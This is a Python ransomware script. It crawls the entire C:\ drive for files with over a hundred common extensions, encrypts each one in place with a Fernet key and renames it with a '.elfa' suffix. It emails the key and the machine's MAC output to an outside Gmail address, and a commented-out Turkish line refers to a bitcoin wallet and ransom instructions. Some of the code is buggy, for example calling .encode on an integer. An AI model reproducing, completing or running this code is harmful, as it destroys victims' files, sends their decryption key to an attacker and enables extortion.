import os
from cryptography.fernet import Fernet
import yagmail
import subprocess

#encrypt_ext = ('.txt')
encrypt_ext = [
    # GENERAL FORMATS
    "dat", "keychain", "sdf", "vcf",
    # IMAGE FORMATS
    "jpg", "png", "tiff", "tif", "gif", "jpeg", "jif", "jfif", "jp2", "jpx", "j2k", "j2c", "fpx", "pcd", "bmp", "svg",
    "3dm", "3ds", "max", "obj", "dds", "psd", "tga", "thm", "tif", "tiff", "yuv", "ai", "eps", "ps", "svg", "indd",
    "pct",
    # VIDEO FORMATS
    "mp4", "avi", "mkv", "3g2", "3gp", "asf", "flv", "m4v", "mov", "mpg", "rm", "srt", "swf", "vob", "wmv",
    # DOCUMENT FORMATS
    "doc", "docx", "txt", "pdf", "log", "msg", "odt", "pages", "rtf", "tex", "wpd", "wps", "csv", "ged", "key", "pps",
    "ppt", "pptx", "xml", "json", "xlsx", "xlsm", "xlsb", "xls", "mht", "mhtml", "htm", "html", "xltx", "prn", "dif",
    "slk", "xlam", "xla", "ods", "docm", "dotx", "dotm", "xps", "ics",
    # SOUND FORMATS
    "mp3", "aif", "iff", "m3u", "m4a", "mid", "mpa", "wav", "wma",

    # EXE AND PROGRAM FORMATS
    "msi", "php", "apk", "app", "bat", "cgi", "com", "asp", "aspx", "cer", "cfm", "css", "htm", "html",
    "js", "jsp", "rss", "xhtml", "c", "class", "cpp", "cs", "h", "java", "lua", "pl", "py", "sh", "sln", "swift",
    "vb", "vcxproj",
    # GAME FILES
    "dem", "gam", "nes", "rom", "sav",
    # COMPRESSION FORMATS
    "tgz", "zip", "rar", "tar", "7z", "cbr", "deb", "gz", "pkg", "rpm", "zipx", "iso",
    # MISC
    "ged", "accdb", "db", "dbf", "mdb", "sql", "fnt", "fon", "otf", "ttf", "cfg", "ini", "prf", "bak", "old", "tmp",
    "torrent"
    ]
encrypted = False
file_paths = []

for root,dirs,files in os.walk('C:\\'):
    for file in files : 
        file_path ,file_ext = os.path.splitext(root+'\\'+file)
        if  file=="the_key.key":
            encrypted = True
            keyfile= root+'\\'+file
        for x in encrypt_ext:
            a="."+x
            if file_ext.endswith(a):
                file_paths.append(root+'\\'+file)
                print(root+'\\'+file)

hatacount =0

if  encrypted:
    with open(keyfile, "rb") as the_file:
            key = the_file.read()
else:
    key = Fernet.generate_key()
    #with open("the_key.key", "a") as the_key:
    #    the_key.write("btc cüzdan adresi ve fidye virüsü bulaştığını çözüm için yapması gereken yönergeleri ")
    mac = subprocess.call("getmac", shell = True)

    # Replace "85e5668737@emailkom.live" with your email address
    # Replace "" with your email password
    yag = yagmail.SMTP("85e5668737@emailkom.live", '')

    # Encode the subject and body to bytes objects
    subject = mac.encode(encoding='utf-8')
    body = key.encode(encoding='utf-8')

    # Send the email
    asas = yag.send("muho893@gmail.com", subject, body) 
    try:
    # Send the email
        message_id, recipients = yag.send("muho893@gmail.com", subject, body)

        # Print the message ID and recipients
        print(f"Message ID: {message_id}")
        print(f"Recipients: {recipients}")

    except yagmail.SMTPAuthenticationError:
        print("Authentication error occurred. Check your email address and password.")
        with open("the_key.key", "ab") as the_key:
            the_key.write(key)

    except yagmail.SMTPException as e:
        print(f"An error occurred: {e}")
        with open("the_key.key", "ab") as the_key:
            the_key.write(key)
        

for file in file_paths:
    try :
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file,"wb") as the_file:
            the_file.write(contents_encrypted)
        print(file)
        with open("paths.key", "a") as the_key:
            the_key.write(file+"/n")
        os.rename(file, file + '.elfa')
    except Exception as e:
        with open("paths.key", "a") as the_key:
            the_key.write("hata=("+Exception+")"+file+"\n")
        print("hata="+file)
        hatacount+=1
        print(hatacount)

print(len((file_paths)-hatacount)+"=Files Encrypted")
print(hatacount)
print(len(file_paths))
